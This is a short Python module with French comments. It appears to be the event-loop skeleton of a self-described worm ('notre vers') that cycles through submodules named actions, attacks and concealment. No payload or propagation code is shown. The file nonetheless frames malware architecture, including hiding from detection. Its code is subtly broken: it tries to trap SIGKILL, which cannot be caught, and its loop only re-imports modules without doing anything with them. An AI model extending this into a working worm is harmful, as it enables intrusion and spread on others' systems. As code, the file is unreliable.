#Imports
from .utils          import endOfProgramm
from .actions        import __all__                  as ACTIONS
from .attaques       import __all__                  as ATTAQUES
from .dissimulations import __all__                  as DISSIMULATIONS
from queue           import Queue                    as FIFO
from signal          import signal, SIGKILL
from importlib       import import_module

#Classes
class Events():
    """
    Classe repreésentant notre boucle d'éxecution
    """
    def __init__(self):
        """
        Constructeur de la classe
        """
        signal(SIGKILL, endOfProgramm)
        self.isStart = True
        print(ACTIONS, ATTAQUES, DISSIMULATIONS)

    def run(self):
        """
        Méthode principale, permet de lancer la boucle pseudo infinie qui gère notre vers
        """
        self.isStart = True
        while self.isStart:
            for action in ACTIONS:
                pkg = import_module(action)
                
    
    def stop(self):
        """
        Mets fin à la boucle d'éxecution
        """
        self.isStart = False